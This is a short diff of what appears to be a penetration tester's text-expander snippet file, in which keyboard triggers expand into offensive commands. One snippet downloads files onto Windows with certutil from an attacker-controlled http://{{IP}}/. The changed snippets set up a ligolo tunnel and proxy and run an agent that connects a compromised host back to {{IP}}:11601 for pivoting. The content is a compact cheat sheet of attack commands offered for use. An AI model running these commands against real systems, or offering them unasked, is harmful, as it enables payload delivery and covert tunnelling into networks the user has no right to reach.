@@ -70,11 +70,8 @@ matches:
     replace: certutil.exe -urlcache -split -f http://{{IP}}/
   
   - trigger: ":pligolo"
-    replace: |
-      sudo ip tuntap add user kali mode tun ligolo
-      sudo ip link set ligolo up
-      ./proxy -selfcert
+    replace: sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && ./proxy -selfcert
   
   - trigger: ":aligolo"
-    replace: .\agent -connect {{IP}}:11601 -ignore-cert
+    replace: .\agent.exe -connect {{IP}}:11601 -ignore-cert
     
